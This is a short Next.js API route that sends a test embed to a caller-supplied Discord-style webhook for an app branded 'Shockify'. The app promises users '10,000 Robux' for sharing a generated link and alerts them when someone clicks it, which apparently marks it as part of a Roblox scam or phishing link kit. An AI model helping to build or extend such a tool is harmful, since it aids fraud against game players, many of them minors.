import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const { webhookUrl } = await request.json()

    if (!webhookUrl) {
      return NextResponse.json({ error: "Missing webhook URL" }, { status: 400 })
    }

    // Send a test message to the webhook
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        embeds: [
          {
            title: "✅ Webhook Test Successful",
            description:
              "Your webhook is working correctly! You'll receive notifications here when someone clicks your link.",
            color: 10181046, // Purple color
            thumbnail: {
              url: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
            },
            fields: [
              {
                name: "🎯 Next Steps",
                value: "Generate your link and start sharing it to earn 10,000 Robux!",
                inline: false,
              },
            ],
            footer: {
              text: "Shockify Webhook Test • " + new Date().toLocaleString(),
              icon_url:
                "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Schermafbeelding%202025-05-02%20001239-lwSJ0WYbOrOhbANP9U3ZIBk4URTt1z.png",
            },
          },
        ],
      }),
    })

    if (!response.ok) {
      const errorText = await response.text()
      console.error(`Webhook error: ${response.status} ${errorText}`)
      return NextResponse.json({ error: `Failed to send webhook notification: ${response.status}` }, { status: 500 })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error testing webhook:", error)
    return NextResponse.json({ error: "Failed to test webhook" }, { status: 500 })
  }
}
